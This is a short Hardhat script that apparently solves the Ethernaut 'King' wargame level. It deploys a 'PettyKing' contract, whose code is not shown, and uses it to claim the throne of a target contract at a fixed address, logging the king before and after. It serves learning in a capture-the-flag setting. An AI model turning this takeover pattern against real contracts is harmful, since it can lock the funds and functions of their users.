const hardhat = require('hardhat');
const ethers = hardhat.ethers;

const INSTANCE_ADDRESS = '0x099C049B33a323115F3b129825B7f45f69a282db';

const abi = ['function _king() public view returns (address)'];

const main = async () => {
    console.log('Checking starting king.');
    const target = await ethers.getContractAt(abi, INSTANCE_ADDRESS);
    let king = await target._king();
    console.log(`Starting king is ${king}`);

    console.log('Deploying our petty king.');
    const PettyKing = await ethers.getContractFactory('PettyKing');
    const pettyKing = await PettyKing.deploy();
    await pettyKing.deployed();
    console.log(`Petty king deployed at ${pettyKing.address}`);

    console.log('Claiming throne by proxy.');
    let tx = await pettyKing.claimThrone(INSTANCE_ADDRESS, {
        gasLimit: 500000,
        value: ethers.utils.parseEther('0.002'),
    });
    await tx.wait();

    console.log('Checking ending king.');
    king = await target._king();
    console.log(`Ending king is ${king}`);
};

main();
